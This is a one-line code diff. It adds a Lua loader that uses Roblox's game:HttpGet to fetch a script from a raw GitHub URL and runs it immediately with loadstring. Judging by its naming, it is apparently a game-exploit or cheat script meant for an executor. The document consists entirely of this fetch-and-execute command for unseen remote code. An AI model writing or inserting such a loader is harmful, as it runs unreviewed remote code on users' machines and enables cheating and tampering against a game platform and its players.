@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/toskaman/batch.scripts/master/V3RM1LL0N", true))()
